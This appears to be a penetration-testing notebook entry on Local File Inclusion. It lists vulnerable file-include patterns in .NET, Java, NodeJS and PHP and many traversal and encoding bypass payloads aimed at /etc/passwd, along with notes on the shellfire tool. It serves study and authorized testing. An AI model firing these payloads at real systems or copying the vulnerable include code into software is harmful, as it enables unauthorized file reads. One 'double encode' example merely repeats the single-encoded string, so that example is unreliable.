---
id: Local File Inclusion
aliases: ["LFI"]
tags:
  - Webapp/Exploitation/File-Inclusion/Local-File-Inclusion
---

# Local File Inclusion

**Local File Inclusion**
(*[LFI](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#Local_file_inclusion)*)
occurs when the web application executes a local file

<!-- Warning {{{-->
> [!warning]
>
> [[#LFI]] vulnerabilities can lead to
>
> - Source code disclosure
> - Sensitive data exposure
> - Remote code execution (*under certain conditions*)
>
<!-- }}} -->

<!-- Info {{{-->
> [!info]- Resources
>
> [OWASP WSTG - v4.2](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
>
<!-- }}} -->

___

<!-- General {{{-->
## General

Templating engines display a page
that shows the common static parts
(*the header, navigation bar, footer*)
and then dynamically load other content
that changes between pages

```sh
/index.php?page=about
```

- `index.php`: Set static content (*e.g. header/footer*)
- `page=about`: Pull dynamic content specified in the parameter

<!-- Example - .NET {{{-->
> [!example]- Example - .NET
>
> | Function | Read Content | Execute | Remote URL |
> | -------- | ------------ | ------- | ---------- |
> | `@Html.Partial()` | ✓ | x | x |
> | `@Html.RemotePartial()` | ✓ | x | ✓ |
> | `Response.WriteFile()` | ✓ | x | x |
> | `include` | ✓ | ✓ | ✓ |
>
> [Response.WriteFile](https://learn.microsoft.com/en-us/dotnet/api/system.web.httpresponse.writefile?view=netframework-4.8.1)
>
> ```cs
> @if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
>     <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
> }
> ```
>
> [@Html.partial()](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/partial?view=aspnetcore-10.0) —
> Render the specified file as part of the front-end template
>
> ```cs
> @Html.Partial(HttpContext.Request.Query['language'])
> ```
>
> [include](https://learn.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524876(v=vs.90)) —
> Render local file, remote URL, and execute the specified file
>
> ```cs
> <!--#include file="<% HttpContext.Request.Query['language'] %>"-->
> ```
<!-- }}} -->

<!-- Example - Java {{{-->
> [!example]- Example - Java
>
> [[Java/General|Java]]
>
> | Function  | Read Content | Execute | Remote URL |
> | --------- | ------------ | ------- | ---------- |
> | `include` | ✓ | x | x |
> | `import`  | ✓ | ✓ | ✓ |
>
> `import` — Include local files based on the specified parameter
>
> ```java
> <c:if test="${not empty param.language}">
>     <jsp:include file="<%= request.getParameter('language') %>" />
> </c:if>
> ```
>
> `import` — Include local files based on the specified parameter
>
> ```java
> <c:import url= "<%= request.getParameter('language') %>"/>
> ```
<!-- }}} -->

<!-- Example - NodeJS {{{-->
> [!example]- Example - NodeJS
>
> [[JavaScript/General|NodeJS]]
>
> | Function | Read Content | Execute | Remote URL |
> | -------- | ------------ | ------- | ---------- |
> | `fs.readFile()` | ✓ | x | x |
> | `fs.sendFile()` | ✓ | x | x |
> | `res.render()`  | ✓ | ✓ | x |
>
> [fs.readFile](https://www.geeksforgeeks.org/node-js/node-js-fs-readfile-method/) —
> Writes the file content in the HTTP response
>
> ```javascript
> if(req.query.language) {
>     fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
>         res.write(data);
>     });
> }
> ```
>
> [res.render()](https://www.geeksforgeeks.org/web-tech/express-js-res-render-function/) —
> The `language` parameter is used to determine
> which directory to pull the `about.html` page from
>
> ```javascript
> app.get("/about/:language", function(req, res) {
>     res.render(`/${req.params.language}/about.html`);
> });
> ```
>
<!-- }}} -->

<!-- Example - PHP {{{-->
> [!example]- Example - PHP
>
> [[PHP/General|PHP]]
>
> | Function | Read Content | Execute | Remote URL |
> | -------- | ------------ | ------- | ---------- |
> | `include()`/`include_once()` | ✓ | ✓ | ✓ |
> | `require()`/`require_once()` | ✓ | ✓ | x |
> | `file_get_contents()` | ✓ | x | ✓ |
> | `fopen()`/`file()` | ✓ | x | x |
>
> [include()](https://www.php.net/manual/en/function.include.php) —
> Load local or remote file
>
> ```php
> if (isset($_GET['language'])) {
>     include($_GET['language']);
> }
> ```
<!-- }}} -->


___
<!-- }}} -->

<!-- Bypass {{{-->
## Bypass

Bypass [[#Local File Inclusion]] restrictions

<!-- Tip {{{-->
> [!tip]- Payloads
>
> [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/#local-file-inclusion)
>
<!-- }}} -->

<!-- Null Byte {{{-->
### Null Byte

Append a null character (*`%00`*) to the payload

<!-- Info {{{-->
> [!info]-
>
> The [Null Character](https://en.wikipedia.org/wiki/Null_character)
> (*also known as null terminator or null byte*)
> is a control character with the value zero
> present in many character sets
> that is being used as a reserved character
> to mark the end of a string
>
> Once used, any character after this special byte will be ignored
>
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
[[PHP/General|PHP]] versions `5.3.4` and earlier
>
<!-- }}} -->

```sh
/index.php?page=../../../etc/passwd%00
```
```sh
/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

<!-- Example {{{-->
> [!example]-
>
> [[Joomla/General|Joomla]] Component Web TV 1.0
> (*[CVE-2010-1470](https://nvd.nist.gov/vuln/detail/CVE-2010-1470)*)
>
> ```sh
> {{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Filters {{{-->
### Filters

Non-recursive filters delete substrings of `../`
to avoid path traversals

<!-- Example {{{-->
> [!example]-
>
> ```php
> $language = str_replace('../', '', $_GET['language']);
> ```
>
<!-- }}} -->

```sh
/index.php?page=....//....//....//....//etc/passwd
```

```sh
/index.php?page=..././..././..././..././etc/passwd
```

```sh
/index.php?page=....\/....\/....\/....\/etc/passwd
```

```sh
/index.php?page=....////....////....////....////etc/passwd
```

<!-- }}} -->

<!-- Encoding {{{-->
### Encoding

[[Pentest/Encoding/URL|URL encode]] all characters
(*including dots*)

<!-- Warning {{{-->
> [!warning]
>
> Some URL encoders may not encode dots
> as they are considered to be part of the URL scheme
>
<!-- }}} -->

Encode

```sh
/index.php?page=%252e%252e%252fetc%252fpasswd
```

Encode all characters

```sh
../../../etc/passwd
```

```sh
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Double Encode

```sh
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

```sh
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```

<!-- Example {{{-->
> [!example]-
>
> [[Burp Suite]] Decoder
>
> ![[burp-encode.png]]
>
<!-- }}} -->

UTF-8 Encode

```sh
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```
```sh
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

<!-- }}} -->

<!-- Filename Prefix {{{-->
### Filename Prefix

Applications may use a file prefix to construct the full file name

<!-- Example {{{-->
> [!example]-
>
> ```php
> include("lang_" . $_GET['language']);
> ```
>
> Traversing results in an invalid path
>
> ```sh
> lang_../../../etc/passwd
> ```
>
<!-- }}} -->

Prefix the payload with a `/`

```sh
/index.php?page=/../../../etc/passwd
```

<!-- Example {{{-->
> [!example]-
>
> ```php
> include("lang_" . $_GET['language']);
> ```
>
> The directory `lang_/` may not exist
>
> ```sh
> lang_/../../../etc/passwd
> ```
>
<!-- }}} -->

<!-- }}} -->

<!-- Appended Extensions {{{-->
### Appended Extensions

**[[#Null Byte]]**

<!-- Warning {{{-->
> [!warning]
>
[[PHP/General|PHP]] versions `5.3.4` and earlier
>
<!-- }}} -->


**Path Truncation**

In earlier versions of [[PHP/General|PHP]],
defined strings have a maximum length of `4096` characters
(*due to the limitation of 32-bit systems*)

```sh
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; \
 do echo -n "./";
done
```


<!-- }}} -->

<!-- Approved Paths {{{-->
### Approved Paths

Applications may use RegEx to ensure
that the file is being included under a specific path

<!-- Tip {{{-->
> [!tip]
>
> Find [[Execution Paths]] under the approved path
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> Accept paths only that are under the `./languages` directory
>
> ```php
> if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
>     include($_GET['language']);
> } else {
>     echo 'Illegal path specified!';
> }
> ```
>
> ```sh
> http://$target/index.php?language=languages/en.php
> ```
<!-- }}} -->

Start the payload with the approved path,
and use `../` to traverse to the `root` directory
and read a file

```sh
/index.php?language=./languages/../../../../etc/passwd
```

<!-- }}} -->

___
<!-- }}} -->

<!-- Second-Order Attacks {{{-->
## Second-Order Attacks

Local File Inclusion is a second-order attack
as it can leverage web application functionalities
to pull files from the backend server
based on user-controllable parameters

<!-- Example {{{-->
> [!example]
>
> Poison the database entry with malicious LFI payload
>
> 1. The web application allows to download the user's avatar
>
> ```sh
> target.com/profile/$username/avatar.png
> ```
>
> 2. Create a malicious LFI username
>
> ```sh
> ../../../etc/passwd
> ```
>
> 3. It may be possible to change the file being pulled
>    to another local file on the server and grab it
>    instead of the avatar
>
<!-- }}} -->

___
<!-- }}} -->

<!-- Tools {{{-->
## Tools

[[shellfire]]

Launch

```sh
shellfire
```

Specify target URL parameter
(*arbitrary*)

```sh
(config)> url http://target.com/?path={}
```

Enter Shell mode

```sh
(config)> shell
```

Configure payload

```sh
(shell)> /etc/passwd
```

> [!todo]

___
<!-- }}} -->
